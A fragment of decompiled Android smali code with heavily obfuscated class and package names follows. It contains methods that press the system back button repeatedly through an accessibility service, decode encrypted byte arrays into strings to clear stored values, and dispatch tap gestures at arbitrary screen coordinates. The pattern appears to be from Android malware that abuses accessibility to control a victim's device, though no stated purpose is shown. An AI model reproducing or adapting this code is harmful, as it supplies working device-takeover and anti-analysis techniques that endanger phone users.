    const-wide/16 v1, 0x65

    :try_start_1
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method public static x(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 2

    .line 1
    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    const/4 v1, 0x1

    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method public static y()V
    .locals 6

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x3

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const-string v4, ""

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sput-object v4, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->S:Ljava/lang/String;

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v5, v3, [B

    fill-array-data v5, :array_5

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array v2, v1, [B

    fill-array-data v2, :array_6

    new-array v5, v3, [B

    fill-array-data v5, :array_7

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v2, v3, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v2, v3, [B

    fill-array-data v2, :array_b

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void

    nop

    :array_0
    .array-data 1
        0x2t
        -0x7at
        -0x29t
    .end array-data

    :array_1
    .array-data 1
        0x63t
        -0xbt
        -0x4dt
        -0x31t
        0x78t
        -0xdt
        -0x66t
        -0x25t
    .end array-data

    :array_2
    .array-data 1
        -0x13t
        -0x1bt
        0x16t
    .end array-data

    :array_3
    .array-data 1
        -0x64t
        -0x6et
        0x73t
        0x31t
        -0x6bt
        0x68t
        -0x5t
        -0x6dt
    .end array-data

    :array_4
    .array-data 1
        0xbt
        0x6et
        0x10t
    .end array-data

    :array_5
    .array-data 1
        0x72t
        0x1bt
        0x79t
        -0x53t
        0x6t
        0x3ft
        0x2dt
        0x49t
    .end array-data

    :array_6
    .array-data 1
        0x4t
        -0xbt
        0x5ft
    .end array-data

    :array_7
    .array-data 1
        0x7et
        -0x73t
        0x29t
        -0x70t
        0x3at
        0x35t
        0x30t
        0x46t
    .end array-data

    :array_8
    .array-data 1
        -0x63t
        -0x70t
        -0x47t
    .end array-data

    :array_9
    .array-data 1
        -0xbt
        -0x17t
        -0x37t
        -0x11t
        -0x5et
        0x63t
        0x6bt
        -0x63t
    .end array-data

    :array_a
    .array-data 1
        0xbt
        0x54t
        0x61t
        0x79t
    .end array-data

    :array_b
    .array-data 1
        0x63t
        0x2dt
        0x11t
        0x1dt
        0x17t
        0x6dt
        0x66t
        0x27t
    .end array-data
.end method

.method public static z(II)Z
    .locals 8

    .line 1
    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v1

    if-nez v1, :cond_0

    return v0

    :cond_0
    new-instance v3, Landroid/graphics/Path;

    invoke-direct {v3}, Landroid/graphics/Path;-><init>()V

    int-to-float p0, p0

    int-to-float p1, p1

    invoke-virtual {v3, p0, p1}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p0, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v4, 0x0

    const-wide/16 v6, 0x5

    move-object v2, p0

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {p1, p0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p0

    const/4 p1, 0x0

    invoke-virtual {v1, p0, p1, p1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    move-result p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return p0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    return v0
.end method
